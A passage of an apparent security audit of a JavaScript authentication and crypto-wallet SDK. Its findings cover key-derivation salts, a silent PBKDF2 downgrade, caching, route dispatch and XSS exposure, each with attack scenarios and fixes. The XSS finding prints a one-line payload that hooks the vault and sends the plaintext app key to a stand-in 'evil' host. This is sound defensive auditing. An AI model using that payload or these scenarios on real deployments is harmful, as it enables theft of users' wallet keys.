For the same (email, passkey) they derive the IDENTICAL app key, because the salt `SHA-256("ttc:" + email)` and the iteration count are identical. A hostile-but-legitimate app operator running the SDK at the default therefore learns, at the moment a user signs up with a re-used email+passkey, the exact 256-bit key that decrypts that user's `encryptedSecret` blobs on every OTHER default-appId deployment — no cracking required, just possession of the ciphertext (obtainable via a shared database, a leaked backup, or the /user-data response on any app where the attacker can authenticate as that user). Identically, a single precomputed PBKDF2 table over common passkeys is valid across the entire default-configured install base instead of one deployment, which is exactly the property the CRYPTO-2 comment claims to have eliminated. For Web3 accounts the same applies to `walletAppKeyMessage("ttc")`: a malicious site that coerces one signature of that fixed message reproduces the app key on every other default deployment.
raw_findings.recommendation: Make `appId` a REQUIRED field with no default, so a deployment cannot accidentally share the namespace and the salt (the migration cost — existing default-appId accounts — is one documented `appId: "ttc"` line, and those deployments are exactly the ones that need to make the choice consciously). Failing that, at minimum: (a) throw from `createAuthHandlers` when `appId === "ttc"` and `NODE_ENV === "production"`, matching the fail-closed pattern already used by `selectStorageBackend`; and (b) remove the `= "ttc"` default parameters from `deriveAppKeyFromPasskey`, `walletAppKeyMessage`, and `walletAppKeyMessageHw` so the domain separator can never be omitted by accident.
raw_findings.prior_art_check: Grepped `grep -rn '"ttc"' tests/ src/` and `grep -rn 'console.warn|appId is the default' tests/` — no test asserts the warning fires, and no test asserts any refusal on the default. tests/multi-app.test.ts:200-211 explicitly characterizes the default as working behavior ("omitting appId falls back to config.appId (default 'ttc') and round-trips"). tests/audit-crypto.test.ts:50-55 only checks that the salt includes an appId. The defect (no fail-closed enforcement, warning is client-only) is not previously reported.

raw_findings.title: An out-of-range `securityLevel` silently downgrades PBKDF2 to 100k instead of failing — `resolveConfig` performs no runtime validation
raw_findings.description: `resolveConfig` is a pure shallow merge with no validation of any value (src/core/config.ts:187-196). `registerWithEmail` then does `PBKDF2_ITERATIONS[this.config.securityLevel]`. `PBKDF2_ITERATIONS` is a 3-entry record; any level outside {1,2,3} yields `undefined`, and `deriveAppKeyFromPasskey(passkey, email, undefined, appId)` triggers its DEFAULT PARAMETER `iterations = 100_000` (src/core/crypto.ts:26). The account is silently created at the weakest documented setting — the one the config comment labels "below OWASP 2023, legacy/compat only". The downgrade is then made permanent and invisible: `pbkdf2Iterations: iterations` is sent as `undefined`, the server's guard is `if (body.pbkdf2Iterations != null && !validIterations(...))` so `undefined` passes and is persisted as absent, `/challenge` returns `pbkdf2Iterations: undefined`, and `loginWithEmail` applies its own `?? 100_000` fallback — so login SUCCEEDS and nothing ever surfaces the mismatch. TypeScript catches a literal `4`, but not `securityLevel: Number(process.env.TTC_SECURITY_LEVEL) as SecurityLevel`, a JavaScript consumer, or a JSON-sourced config — all normal integration patterns.
raw_findings.attack_scenario: An integrator wires `securityLevel` to an environment variable and the variable is unset, misspelled, or set to `4`/`0`. `Number(undefined)` is `NaN`; `PBKDF2_ITERATIONS[NaN]` is `undefined`; every account created from then on is derived at 100k iterations instead of the intended 600k or 1M, with no error, no warning, and no observable behavioral difference. When the database is later read by an attacker (in scope per the threat model), those users' wallet ciphertexts are 6–10× cheaper to brute-force offline than the operator believes, and there is no way to detect the affected cohort after the fact because the pinned count is simply absent from the record rather than wrong.
raw_findings.recommendation: Validate in `resolveConfig` and throw on anything outside the documented domain: `securityLevel ∈ {1,2,3}`, `sessionTtlSeconds > 0`, `challengeTtlSeconds > 0`, `rateLimit.maxAttempts >= 1`, `rateLimit.windowSeconds >= 1`, `maxWalletsPerUser >= 1`, `appId` matching `APP_ID_RE`. A KDF strength setting must never fall back silently. Separately, remove the `iterations = 100_000` default parameter from `deriveAppKeyFromPasskey` so an omitted count is a type error rather than a downgrade.
raw_findings.prior_art_check: Grepped `grep -rn 'securityLevel' tests/` — tests/pbkdf2-iteration-cost.test.ts:85-92 asserts only the three VALID levels (1/2/3) and the default of 2; tests/audit-crypto.test.ts:41-42 asserts the default maps to ≥600k. No test passes an invalid level. `grep -rn 'resolveConfig' tests/` shows no validation/throw test at all. Not previously found.

raw_findings.title: README.md, SECURITY.md and CHANGELOG.md are all 0 bytes on a published npm package; the security guidance and ADR/PRD documents the code cites do not exist
raw_findings.description: `ls -la` confirms README.md, SECURITY.md and CHANGELOG.md are each 0 bytes. `npm pack --dry-run` confirms the published tarball is exactly `dist/`, `LICENSE`, `README.md` (empty) and `package.json` — `files: ["dist"]` means src/ never ships. Consequences for a package whose stated purpose is holding users' wallet keys: (1) NO vulnerability-disclosure policy — a researcher finding a key-compromise bug has no contact channel or embargo process, only a public GitHub issues URL, which forces full public disclosure of a wallet-compromising bug. (2) Every security-critical integration requirement exists ONLY as a source comment: override `appId` (config.ts:63-66), set `allowedAppIds` in production (config.ts:78-81), never use `MemoryAdapter` in production (memory.ts:1), enable `trustProxyHeaders` only behind a trusted proxy (config.ts:120-124), never pass `skipPreflight` (sql/index.ts:45-50), keep the pg Pool a module singleton, SQLite cannot back serverless. JSDoc survives into the `.d.ts` files (verified: dist/core/index.d.ts:10 carries the appId note), so an IDE hover shows some of it — but the npmjs.com page, any docs-first evaluation, and any security review of the package show nothing at all. (3) The code repeatedly cites design documents that are absent from the repository: `find . -name '*.md' -not -path './node_modules/*'` returns only the three empty files, CLAUDE.md, and three .claude/skills files. `PRD/ADR-001-storage-seam.md`, `PRD/ADR-002`, `PRD/v0.5.0-PRD.md` and `USE_IN_CODE.md` are referenced from src/storage/store.ts:3, src/storage/adapter.ts:12, src/storage/sql/index.ts:9, src/core/crypto.ts:136 and src/ui/EmailMethod.tsx:2 but do not exist — the security rationale for the storage seam and the session-hashing design is unreviewable.
raw_findings.attack_scenario: Not a memory-corruption exploit, but a direct contributor to every other finding here. An integrator installs `@tetrac/login-sdk`, follows the (blank) README, and ships with `appId: "ttc"`, no `allowedAppIds`, and a passkey field with no strength policy — the exact default-configuration compromise chain described above. Separately, a researcher who discovers a wallet-key-disclosure bug has no private channel and either drops it publicly (mass exposure before a patch exists) or discards it. The absent ADR/PRD files mean an auditor cannot verify the claimed security properties of the storage seam against their stated design.

-rw-r--r--@ 1 mac  staff    0 Aug  5 13:37 README.md
-rw-r--r--@ 1 mac  staff    0 Aug  5 13:37 SECURITY.md
-rw-r--r--@ 1 mac  staff    0 Aug  5 13:37 CHANGELOG.md

$ npm pack --dry-run  (non-dist entries)
['LICENSE', 'README.md', 'package.json']

// src/storage/store.ts:3 — cites a file that is not in the repo
// WHY THIS EXISTS (see PRD/ADR-001-storage-seam.md):
raw_findings.recommendation: Write SECURITY.md with a private disclosure address, supported-version window, and response SLA before the next publish. Write a README whose FIRST section is a production checklist: set a unique `appId`; set `allowedAppIds`; never `MemoryAdapter` in production; enable `trustProxyHeaders` only behind a trusted proxy; never `skipPreflight`; enable Supabase RLS; enforce a passkey strength policy. Commit the referenced ADR/PRD files or strip the dangling references from the source comments so reviewers are not sent to documents that do not exist.
raw_findings.prior_art_check: `find . -name '*.md' -not -path './node_modules/*'` returns only ./CHANGELOG.md (0 bytes), ./README.md (0 bytes), ./CLAUDE.md, ./SECURITY.md (0 bytes) and the three .claude/skills SKILL.md files. `ls -la audits/` shows the audits directory is empty. Nothing in tests/ asserts documentation presence. This is a current, unaddressed state, not a previously-fixed issue.

raw_findings.title: `resolveConfig()` returns the shared mutable DEFAULT_CONFIG singleton, and `AuthHandlers.config` exposes it process-wide
raw_findings.description: `resolveConfig` short-circuits with `if (!override) return DEFAULT_CONFIG;` — returning the module-level object itself, not a copy. `DEFAULT_CONFIG` is not frozen. Every `createAuthHandlers({ storage })` and `new AuthClient({...})` without an explicit `config` therefore shares one object identity, and `createAuthHandlers` publishes it: `AuthHandlers.config` is a public field returned at routes.ts:200. (Note the override path is safe for nested groups — `keyPrefixes`/`rateLimit`/`webauthn` are rebuilt — so only the no-override case leaks the singleton, and only the top-level fields of it.)
raw_findings.attack_scenario: A multi-tenant Node process hosts handler sets for several apps, or an integrator writes what looks like a local tweak — `const h = createNextAuthRoutes({ storage }); h.handlers.config.appId = "tenant-b";` or `h.handlers.config.sessionTtlSeconds = 86400;`. Because the object IS `DEFAULT_CONFIG`, the mutation retroactively applies to every other default-configured handler set and every `AuthClient` in the process, silently re-pointing another tenant's storage namespace or extending its session lifetime. It requires an integrator mistake to trigger, but the API surface invites exactly that mistake by exposing a `config` field that looks per-instance and is not.
raw_findings.recommendation: Always return a fresh object: drop the `if (!override) return DEFAULT_CONFIG;` fast path (or return a structured clone), and `Object.freeze` `DEFAULT_CONFIG` plus its nested groups so an accidental mutation throws in strict mode instead of silently propagating.
raw_findings.prior_art_check: Grepped `grep -rn 'freeze|toBe(DEFAULT_CONFIG)' tests/ src/` — the only `freeze` hits are unrelated (page-freeze event listeners in src/client/session.ts). `grep -rn 'resolveConfig' tests/` finds only tests/pbkdf2-iteration-cost.test.ts:89-91, which reads `.securityLevel` and never checks object identity or immutability. Not previously reported.

raw_findings.title: `readJson` parses request bodies of unbounded size before any size validation, and the SDK exposes no body-size configuration
raw_findings.description: `readJson` is `(await req.json()) as T` with no `Content-Length` check and no streaming bound. Every route calls it before any validation runs: `/register` calls it at routes.ts:242 and only reaches `validateWallets` (which caps 16 entries × 8192 chars) at line 268, long after the entire body has been materialised as a JS object. `AuthConfig` contains no `maxBodyBytes` or equivalent, so an integrator has no SDK-level knob to bound it; whether any cap applies depends entirely on the host framework's own defaults, which the (empty) documentation never mentions. The Next.js App Router binding in src/next/routes.ts passes the raw `Request` straight through and adds no limit of its own.
raw_findings.attack_scenario: An unauthenticated attacker POSTs a multi-hundred-megabyte JSON array to `/api/auth/register`. The full body is buffered and parsed into memory before the 16-wallet / 8192-char caps are consulted, so peak allocation is attacker-controlled and the request is rejected only after the cost has been paid. A handful of concurrent such requests can OOM a small serverless instance or container. The blast radius is bounded by whatever the host framework or platform enforces upstream — which is precisely the problem: the SDK neither enforces nor documents a bound.
raw_findings.recommendation: Add a `maxBodyBytes` to `AuthConfig` (a low default, e.g. 256 KB — comfortably above the 16×8192 wallet ceiling) and enforce it in `readJson` by rejecting on `Content-Length` above the cap and by bounding the read when the header is absent. At minimum, document the requirement so integrators configure it at the edge.
raw_findings.prior_art_check: Grepped `grep -rniE 'body size|payload|maxBody|content-length' tests/ src/` — the only hits are tests/server.test.ts:306 ("wallet payload validation (M3)"), which tests the post-parse `validateWallets` count/length caps, and unrelated conformance-suite `payload` variables. No test or config addresses pre-parse body size. Not previously found.

raw_findings.title: docker-compose.test.yml publishes Postgres and MySQL with the password `pw` on all host interfaces
raw_findings.description: The test-engine compose file sets `POSTGRES_PASSWORD: pw` and `MYSQL_ROOT_PASSWORD: pw` and publishes them with the short syntax `"55432:5432"` / `"53306:3306"`, which binds 0.0.0.0 rather than loopback. Docker's published ports install their own NAT/forward rules, so on Linux hosts they are commonly reachable even when a host firewall (ufw) appears to block the port. The same credentials are baked into the `test:docker` and `test:engines` npm scripts in package.json. This file is not shipped (`files: ["dist"]` — confirmed by `npm pack --dry-run`), so the exposure is limited to developer machines and CI runners, not to consumers.
raw_findings.attack_scenario: A developer runs `npm run docker:up` on a laptop joined to a coffee-shop, conference, or shared office network, or a self-hosted CI runner sits on a flat network. Anyone on that L2 segment reaches `<host>:55432` and `<host>:53306` and authenticates as `postgres`/`pw` and `root`/`pw`. MySQL root additionally permits `LOAD DATA LOCAL INFILE` and file operations depending on `secure_file_priv`, turning a weak-credential database into a host foothold on the developer's machine. If the developer has ever pointed the SDK at these containers with real data (the conformance suite writes `UserData` blobs), that data is readable too.
raw_findings.evidence:
postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_PASSWORD: pw
      POSTGRES_DB: tetrac_test
    ports:
      - "55432:5432"

  mysql:
    image: mysql:8
    environment:
      MYSQL_ROOT_PASSWORD: pw
      MYSQL_DATABASE: tetrac_test
    ports:
      - "53306:3306"
raw_findings.recommendation: Bind the published ports to loopback explicitly — `"127.0.0.1:55432:5432"`, `"127.0.0.1:53306:3306"`, `"127.0.0.1:56379:6379"`. The comment already explains the non-standard port choice; loopback binding costs nothing and removes the LAN exposure entirely. Nothing in the test suite connects from outside the host.
raw_findings.prior_art_check: Grepped the repo for any loopback binding or alternative compose file — docker-compose.test.yml is the only compose file and uses the short port syntax throughout. .gitignore correctly excludes `.env`/`.env.*` with a `!.env.example` exception, and .env.example contains no real values, so this is the only credential exposure I found. `grep -rniE 'password|secret_key|api_key|AKIA|sk_live|ghp_' src/` returned no hardcoded secrets in shipped source. No prior finding covers the compose bind address.

raw_findings.title: No Cache-Control/Vary on any response; GET /user-data returns the full user record to a shared-cache-friendly URL
raw_findings.description: `json()` is the single response constructor for every route handler, and it emits exactly one header: `content-type`. Nothing in the SDK ever sets `Cache-Control`, `Pragma`, `Surrogate-Control`, or `Vary` (grep for those strings across `src/` and `tests/` returns zero hits). Two of the routes wired by `createNextAuthRoutes` are GET — `user-data` and `search-wallet` — and `user-data` returns the complete `UserData` record: identity `publicKey`, `email`, `authMethod`, and every `encryptedSecret` ciphertext. Critically, the auth material for that GET travels in the custom headers `ttc-auth-token` / `ttc-public-key` / `ttc-app-id` rather than a cookie, and no `Vary` header names them. A shared cache therefore computes its cache key from the URL alone (`/api/auth/user-data`), and — unlike a `Set-Cookie`/`Cookie`-bearing response, which caches heuristically treat as private — a custom-header-authenticated 200 JSON response with no explicit freshness directives is heuristically cacheable per RFC 9111 §4.2.2. The SDK is framework-agnostic (`src/server/routes.ts` is pure Web Request/Response and `src/next/routes.ts` re-exports it unchanged), so it cannot rely on any host framework to add the directive, and it ships no `export const dynamic`/`revalidate` guidance either — `package.json` declares `next: ">=14"`, and in Next 14 GET Route Handlers are statically cached by default unless the route bails out to dynamic.
raw_findings.attack_scenario: Two employees of the same company, both users of an app built on this SDK, sit behind a shared forward proxy (or the app is fronted by a CDN configured with heuristic caching for uncached-but-cacheable origins). User A's browser issues `GET /api/auth/user-data` with A's `ttc-auth-token` header; the origin returns 200 with A's email, identity publicKey and all encrypted wallet blobs and no `Cache-Control` and no `Vary`. The proxy stores it keyed on the URL. User B then loads the app; B's browser issues the same `GET /api/auth/user-data` with B's own token, the proxy serves A's cached record, and B's `AuthProvider` caches it into React context (`setUser(fresh)`), so B's UI now displays A's email and A's wallet addresses, and B's app has A's encrypted wallet ciphertexts — which, under the stated threat model, is exactly the material an offline cracking attack needs. The same URL is also what a browser back/forward or a `curl`-based support script would replay.
raw_findings.recommendation: Add `"cache-control": "no-store, private"` (and, defensively, `"vary": "ttc-auth-token, ttc-public-key, ttc-app-id"` built from `config.sessionHeader`/`publicKeyHeader`/`appIdHeader`) to the headers `json()` emits — it is the single choke point, so one edit covers every route. Additionally document in the `createNextAuthRoutes` header comment that consumers should add `export const dynamic = "force-dynamic"` alongside `export const { GET, POST }`, so a Next 14 build cannot statically bake `user-data`/`search-wallet`.
raw_findings.prior_art_check: Grepped `grep -rni "access-control|cors|cache-control|no-store|vary" src/ tests/` — zero hits for any cache or CORS directive anywhere in the repo. tests/next-routes.test.ts asserts only status codes and JSON bodies, never a response header. No audit-*.test.ts references caching.

raw_findings.title: useAuth().reauthenticate silently arms an UNVALIDATED app key whenever the user record has not loaded, contradicting its own documented guarantee
raw_findings.description: `reauthenticate` is documented as "Validates against a known wallet (so a wrong passkey is rejected, not silently armed)", and it implements this by passing `user?.wallets?.[0]` as `AuthClient.unlock`'s `validateWith` argument. But `validateWith` is optional, and `unlock` skips validation entirely when it is undefined — it just calls `armAppKey(appKey)`. `user` comes from `AuthProvider`, which starts at `useState<UserData | null>(null)` and only populates it after an async `/user-data` round trip fired from a mount effect. So during the entire fetch window — and permanently if that fetch fails, since `refetchUser` has a `try/finally` with no `catch` and leaves `user` at `null` — `user?.wallets?.[0]` is `undefined` and any credential whatsoever arms the vault. The failure is completely silent: `armAppKey` calls `notify()`, `refresh()` recomputes `getAuthStatus()`, and because a token and publicKey are in localStorage while `getAppKey()` now returns non-null, `status` flips to `"authenticated"` and `useAuth().isAuthenticated` becomes true. The same window is also the exact moment the unlock UI is on screen: after a reload the app key is gone (memory-only vault), so status is `session_expired` and the app renders its "enter your passkey to unlock" prompt *before* `/user-data` has resolved.
raw_findings.attack_scenario: Not remote-attacker-driven — this is a broken control with a shared-device / wrong-credential impact. A user reloads the wallet page; `AuthProvider` sets `publicKey` from localStorage, status is `session_expired`, and the app shows its unlock prompt while `/user-data` is still in flight (or has failed on a flaky network). The user (or someone else at a shared machine) types a wrong passkey and submits. `unlock` derives an app key from the wrong passkey, `validateWith` is `undefined`, so no decryption check runs and the wrong key is armed. `useAuth().isAuthenticated` returns true and an app that gates its "Send funds" / "Export key" screens on that flag — which is precisely what the hook advertises — unlocks them for the wrong credential. If the user then calls `client.enableBiometricUnlock(...)`, which wraps "the CURRENT vault app key", the biometric blob permanently stores the garbage key, so every future Touch-ID unlock on that device yields a key that decrypts nothing.
raw_findings.recommendation: Fail closed: refuse to arm when there is nothing to validate against. Either throw when `user` is null / `user.wallets` is empty (`if (!user?.wallets?.length) throw new Error("Cannot re-authenticate before the account record has loaded")`), or expose `userLoading` through `useAuth()` and have the UI disable the unlock control until the record is present. At minimum, surface a distinct "unverified" status instead of flipping to `"authenticated"` when `validateWith` was undefined.
raw_findings.prior_art_check: Grepped `grep -rn "reauthenticate|validateWith|unlock(" tests/` — the only hits are tests/auth-client.test.ts:257 and :262, which call `client.unlock({ passkey }, wallet)` and `client.unlock({ passkey: WRONG_PASSKEY }, wallet)` — both always pass a wallet. There is no test of the `validateWith === undefined` branch, and tests/react-hooks.test.tsx never exercises `reauthenticate` at all.

raw_findings.title: Prototype-chain route dispatch: POST /api/auth/valueOf (and 7 sibling names) yields an unauthenticated 500 instead of 404
raw_findings.description: `postRoutes` and `getRoutes` are plain object literals, so they inherit `Object.prototype`. The dispatcher tests the looked-up value for truthiness only — `handler ? handler(req) : error("Not found", 404)` — with no `Object.prototype.hasOwnProperty.call()` guard and no `Object.create(null)` base. Every `Object.prototype` member name therefore resolves to a truthy value and is invoked as if it were a route handler. Because `POST`/`GET` are `async`, the resulting synchronous `TypeError` becomes a rejected promise, and the non-`Response` return values propagate to Next.js as an invalid handler result. Verified empirically against the shipped `dist/next/index.cjs`: `nope` -> Response 404 (correct); `toString` -> NOT A RESPONSE: [object String]; `valueOf` -> THREW TypeError: Cannot convert undefined or null to object; `constructor` -> NOT A RESPONSE: [object Request]; `__proto__` -> THREW TypeError: handler is not a function; `hasOwnProperty` -> THREW TypeError: Cannot convert undefined or null to object. The same applies to `isPrototypeOf`, `propertyIsEnumerable`, and `toLocaleString`, and to the GET dispatcher.
raw_findings.attack_scenario: An unauthenticated attacker sends `POST /api/auth/valueOf` (and `/toString`, `/constructor`, `/__proto__`, `/hasOwnProperty`, `/isPrototypeOf`, `/propertyIsEnumerable`, `/toLocaleString`) with no body and no headers. Each request produces an uncaught exception or an invalid-handler-result error inside the Next.js runtime rather than the intended 404, so the attacker gets: (a) a cheap, credential-free way to flood the deployment's error-reporting pipeline (Sentry/Vercel logs) with distinct unhandled-rejection stack traces, drowning real alerts and consuming quota; (b) 500-class responses from an auth endpoint, which is a fingerprintable signal that this SDK is in use. On any host that renders a non-generic error page or streams the stack, it also leaks internal framework/file paths.
raw_findings.recommendation: Build both maps with a null prototype (`const postRoutes: Record<string, Handler> = Object.assign(Object.create(null), { challenge: ..., ... })`) or guard the lookup: `const handler = Object.prototype.hasOwnProperty.call(postRoutes, action) ? postRoutes[action] : undefined;`. Also add `typeof handler === "function"` to the ternary as belt-and-braces, and wrap the dispatch in a try/catch that returns a 500 `Response` so a handler throw can never escape as an invalid route result.
raw_findings.prior_art_check: Read tests/next-routes.test.ts in full. It has "404s an unknown POST action" (line 59) and "404s an unknown GET action" (line 76), but both use the harmless string `"nope"` / `"whatever"`. `grep -rn "__proto__|prototype|Object.create(null)|hasOwnProperty" tests/next-routes.test.ts src/next/routes.ts` returns zero hits — no guard exists and no test covers it. Confirmed live against dist/next/index.cjs.

raw_findings.title: XSS blast radius: the plaintext app key and the auto-lock policy are reachable and MUTABLE via the well-known global Symbol.for("tetrac.vault")
raw_findings.description: The vault state is hung off `globalThis` under `Symbol.for("tetrac.vault")` — a cross-realm *registered* symbol, so any script on the page reconstructs the exact key with one expression. The property is installed non-enumerable and non-writable, but neither of those protects the *object*: `memoryAppKey`, `autoLockMs`, `lockOnHide`, `lockDeadline` and the `listeners` Set are all plain mutable fields. The documented mitigations for XSS in this SDK are precisely (a) "the app key lives in MEMORY ONLY... storage-scraping XSS finds no key at rest" and (b) "It auto-locks after `autoLockMs` of inactivity (default 15s) and on tab hide" — and (b) is stored on this same reachable, mutable object. `bindHideHandler` deliberately re-reads `vault.lockOnHide` at fire time ("RE-CHECK lockOnHide at fire time"), so flipping that field disables hide-locking for already-bound listeners too. The in-code justification, "Non-enumerable so it stays out of for-in / JSON of globalThis", describes an anti-enumeration property that offers no protection at all against a direct named lookup.
raw_findings.attack_scenario: An attacker who achieves XSS on the integrating app (an explicit threat-model assumption) runs, at any time — including long before the user logs in: `const v = globalThis[Symbol.for("tetrac.vault")]; v.autoLockMs = 2**31 - 1; v.lockOnHide = false; v.lockDeadline = null; v.listeners.add(() => v.memoryAppKey && fetch('//evil/x?k=' + v.memoryAppKey));`. This converts the advertised 15-second exposure window into an unbounded one (the idle timer is re-armed from `vault.autoLockMs` on every `armAppKey`/`touchVault`, and `lockSnapshot`/`isLocked` compare against the poisoned `lockDeadline`), disables the tab-hide and page-freeze locks, and installs a persistent exfiltration callback that `notify()` invokes on the *next* successful login or unlock. The attacker therefore does not need to be present at the moment of authentication and does not need to race the 15s window. `armAppKey` sets `vault.memoryAppKey = appKey` before `notify()`, so the listener reads the live plaintext app key — the AES-GCM key that decrypts every `encryptedSecret` in the account, i.e. full wallet compromise. The property is left `configurable: true`, so the attacker can also `delete globalThis[sym]` and install a substitute object that any lazily-imported SDK bundle copy will then resolve.
raw_findings.recommendation: Keep the shared-state design (it fixes a real dual-bundle bug) but shrink the attack surface: (1) expose only opaque accessor functions on the global slot and hold `memoryAppKey` in a module-private closure/WeakMap that the slot cannot reach; (2) freeze the policy fields — read `autoLockMs`/`lockOnHide` from a `Object.freeze`d config object rather than mutable properties, so XSS cannot extend the window; (3) set `configurable: false` so the slot cannot be deleted and replaced; (4) replace the misleading "non-enumerable so it stays out of for-in" comment with an explicit statement that this is a bundling fix, not a security boundary, and that XSS during an unlocked window is game-over for the account. Document a CSP requirement in SECURITY.md (currently a 0-byte file).
raw_findings.prior_art_check: Grepped `grep -rn "Symbol.for|tetrac.vault|memoryAppKey" tests/`. All hits are in tests/dual-bundle-vault.test.ts (asserts BOTH bundles resolve the same slot and that no per-bundle `var memoryAppKey` exists), tests/cross-tab-lock.test.ts:42 and tests/audit-client-vault.test.ts:39 (both just `delete (globalThis as any)[Symbol.for("tetrac.vault")]` to simulate a reload). Every existing test treats the global slot as a correctness fixture; none tests reachability, mutability of `autoLockMs`/`lockOnHide`, or listener injection.

raw_findings.title: AuthProvider freezes AuthClientOptions at mount, so a changed config.appId keeps deriving keys and writing records under the previous tenant's namespace
raw_findings.description: `AuthProvider` constructs the `AuthClient` inside `useMemo(..., [])` with an explicit eslint-disable and the comment "options are read once on mount". `AuthClient`'s constructor snapshots `resolveConfig(opts.config)` into `this.config`, and that snapshot is what every subsequent operation uses: `post()` stamps `appId: this.config.appId` into every request body, `authHeaders()` sends `[this.config.appIdHeader]: this.config.appId`, and `deriveAppKeyFromPasskey(params.passkey, params.email, iterations, this.config.appId)` mixes it into the PBKDF2 salt. `appId` is documented as the thing that "DOMAIN-SEPARATES app-key derivation" and as "the server-side storage namespace" for `pubKey:`, `challenge:`, `session:` and rate-limit keys — and the SDK explicitly invites per-request appIds (`allowedAppIds`, `appIdHeader`, the v0.4.0 multi-app design). But if the integrator drives `appId` from application state (a route param, a tenant selector, an org switcher) without also forcing a remount, the change is silently discarded: no warning, no re-derivation, no error. The SDK ships no guidance on this — `README.md`, `SECURITY.md` and `CHANGELOG.md` are all 0 bytes.
raw_findings.attack_scenario: An operator runs a multi-tenant deployment and renders `<AuthProvider apiBaseUrl="/api/auth" config={{ appId: tenantId }}>` where `tenantId` comes from the route, exactly as the multi-app documentation invites. A user is on tenant A, then client-side-navigates to tenant B; React reconciles the same `AuthProvider` element (no `key`), so the memo never re-runs and `this.config.appId` stays `"tenant-a"`. The user signs up on tenant B: the client derives the app key with tenant A's salt, POSTs `{ appId: "tenant-a", email, publicKey, wallets }`, and the server — whose `validateAppId` sees a perfectly well-formed, allowlisted id — writes the record into tenant A's `pubKey:tenant-a:` namespace and indexes the email under tenant A. Tenant A's operator (a hostile app operator is in the threat model) can now enumerate and read that user's record, including every `encryptedSecret`, via their own tenant's `/user-data` and `/search-wallet`. From tenant B's side the account is simply invisible. This is a cross-tenant isolation break produced entirely by a natural integration, with no warning from the SDK.
raw_findings.recommendation: Detect the mismatch instead of silently ignoring it: keep the memo stable but add `useEffect` that compares the current `options.config?.appId` / `options.apiBaseUrl` against the ones the client was built with and throws (or at minimum `console.error`s) on divergence — the same posture already used for the default-`appId` nudge in `AuthClient`'s constructor. Better still, key the memo on `[options.apiBaseUrl, options.config?.appId]` so a tenant switch mints a fresh client, and document in the provider's JSDoc that `<AuthProvider key={tenantId} …>` is mandatory when `appId` is dynamic. Populate SECURITY.md with the multi-tenant contract.
raw_findings.prior_art_check: Read tests/multi-app.test.ts's neighbours and grepped tests/react-hooks.test.tsx: every wrapper hard-codes `config={{ appId: APP_ID, ... }}` as a constant (lines 54 and 231) and no test ever changes `appId` on a mounted provider. `grep -rn "appIdHeader|allowedAppIds" tests/` shows the multi-app coverage is entirely server-side (storage namespacing), never the React client's config lifecycle.

raw_findings.title: ExportKeyPanel re-invokes onReveal with the plaintext private key on every parent re-render
raw_findings.description: The reveal-notification effect lists `onReveal` in its dependency array. `onReveal` is a consumer-supplied prop, and the overwhelmingly common React idiom is an inline arrow (`<ExportKeyPanel onReveal={(k) => …} />`), which gets a fresh identity on every render of the parent. The effect therefore re-runs — and re-passes the decrypted private key to the consumer's callback — on every unrelated parent re-render for as long as `plaintext` is non-null (up to 60 s by default). Contrast the adjacent React-Native effect at line 88, whose deps are `[plaintext, postToReactNativeWebView]` — both stable — so it correctly fires once. This directly undercuts the file's own stated goal of keeping "the window tight" around the plaintext.
raw_findings.attack_scenario: An integrator wires `onReveal` to any sink that persists or transmits — `onReveal={(k) => analytics.track('key_revealed', { k })}`, `onReveal={(k) => logger.debug(k)}`, or a state setter in a parent that also re-renders on a timer/websocket. Each parent re-render during the 60-second reveal window ships the plaintext Solana/EVM private key to that sink again. With a 1 Hz parent re-render (a countdown timer, a price ticker, a wallet-balance poll — all normal on a crypto surface) the key is written to third-party analytics or a log aggregator ~60 times per reveal instead of once, multiplying the number of places the key comes to rest and the number of systems whose breach now equals wallet compromise.
raw_findings.recommendation: Hold the callback in a ref that an effect keeps current, and depend only on `plaintext`: `const onRevealRef = useRef(onReveal); useEffect(() => { onRevealRef.current = onReveal; }); useEffect(() => { if (plaintext) onRevealRef.current?.(plaintext); }, [plaintext]);`. Apply the same treatment to the `onError` effect on line 84. Also document in `ExportKeyPanelProps.onReveal` that the handler must not log or transmit the value.
raw_findings.prior_art_check: `grep -rn "onReveal|postToReactNativeWebView|ReactNativeWebView" tests/` returns no matches — zero test coverage for either callback. tests/ui-hardware-wallet.test.tsx renders `<ExportKeyPanel>` but mocks `useExportKey` wholesale (line 25) so `plaintext` never becomes non-null and the effect never fires.

raw_findings.title: ExportKeyPanel's advertised clipboard auto-wipe fails silently, is never cancelled, and clobbers unrelated clipboard content
raw_findings.description: Three defects in one handler. (1) The wipe timer's handle is discarded, so it is never cleared on unmount or on a second copy — `handleCopy` has no cleanup and the component has no corresponding `useEffect` teardown (compare the `copiedFlash` effect at line 127, which *does* return `clearTimeout`). (2) The wipe write is `.catch(() => {})` with the comment "ignore — page may be unfocused", and the Clipboard API rejects `writeText` whenever the document is not focused — the single most likely state 30 s after a user copies a key and switches to their password manager or wallet app. When that happens the private key stays on the clipboard indefinitely and the UI gives no indication, while the component's own header comment and the default `warning` label advertise "clipboard auto-wipe" as a protection. (3) The wipe is unconditional — it writes `""` regardless of what is on the clipboard now.
raw_findings.attack_scenario: Two concrete outcomes. (a) False assurance: a user copies their private key, tabs away to paste it into a password manager, and the 30 s wipe rejects because the page is unfocused; the exception is swallowed. The key remains in the OS clipboard — and in Windows Clipboard History (Win+V) / macOS-iOS Universal Clipboard, which a `writeText("")` cannot purge in any case — available to every other application on the machine and to any subsequently visited page that calls `navigator.clipboard.readText()` on a paste event. The user believes the SDK wiped it. (b) Cross-surface clobber: the user copies the key, navigates away (the panel unmounts but the orphaned timer survives), and within 30 s copies a recipient wallet address to send funds. The stale timer fires and blanks the clipboard; the user pastes an empty destination into the send form.
raw_findings.recommendation: Store the timer in a ref and clear it on unmount and on re-copy. Before wiping, read back the clipboard (or track a copy token) and only overwrite if the current content still equals the revealed key. Surface the outcome to the user — flip the label to "Clipboard cleared" on success and to "Could not clear clipboard — clear it manually" on rejection, rather than swallowing. Amend the default `warning` label and the file header so they do not promise a wipe that is best-effort and cannot touch OS clipboard history.
raw_findings.prior_art_check: `grep -rn "userSelect|secretBlock|autoClearMs|clipboard" tests/` — the only clipboard tests are tests/ui-login-panel-ux.test.ts:412-450, and they cover EmailMethod's passkey generator, whose documented behaviour is the opposite ("never schedules a clipboard wipe", DECIDED-4). ExportKeyPanel's `handleCopy` has no test at all; tests/ui-hardware-wallet.test.tsx mocks `useExportKey` so the Copy button never renders.

raw_findings.title: ExportKeyPanel autoClearMs:0 does not disable auto-clear as its own prop documentation states
